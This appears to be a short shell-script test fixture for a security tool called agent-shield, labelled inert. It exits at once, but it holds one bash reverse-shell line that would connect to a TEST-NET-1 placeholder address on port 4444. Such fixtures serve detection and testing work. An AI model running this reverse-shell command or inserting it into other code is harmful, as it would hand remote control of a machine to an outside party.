#!/bin/sh
# INERT TEST SAMPLE for agent-shield: exits immediately. 192.0.2.0/24 is TEST-NET-1.
exit 0
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
